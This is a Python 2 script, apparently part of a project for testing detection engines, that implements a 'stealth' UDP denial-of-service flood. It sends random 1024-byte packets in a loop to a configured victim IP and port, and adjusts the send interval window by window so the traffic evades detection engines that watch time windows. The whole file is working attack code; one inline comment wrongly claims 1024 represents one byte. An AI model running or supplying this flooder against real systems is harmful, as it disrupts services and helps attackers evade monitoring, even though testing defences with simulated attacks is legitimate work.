"""
UDP flooder to simulate stealth DOS attack
It will start slowly and increase its rate in order to avoid engines which work with time window

Gets the configs.victim IP as an argument
"""
import random
import socket
import time

from .. import configs

# GLOBALS
client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bytes = random._urandom(1024)  # 1024 represents one byte to the server

sent = 0


def stealth_dos():
    global sent
    duration = 0

    while True:
        # send packet
        client.sendto(bytes, (configs.victim, configs.HTTP_PORT))

        # increment counter
        sent += 1

        # print log
        print "%s packets were sent to %s:%s. interval time: %s, send interval: %s" % (sent, configs.victim, configs.HTTP_PORT, duration, configs.send_interval)

        # sleep for send_interval secs
        time.sleep(configs.send_interval)

        # increment duration
        duration += configs.send_interval

        # if window len wasn't over continue
        if duration < configs.window_length:
            continue

        # start new window and initial duration and send interval
        duration = 0

        configs.send_interval *= configs.interval_factor


# Main
if __name__ == '__main__':
    stealth_dos()
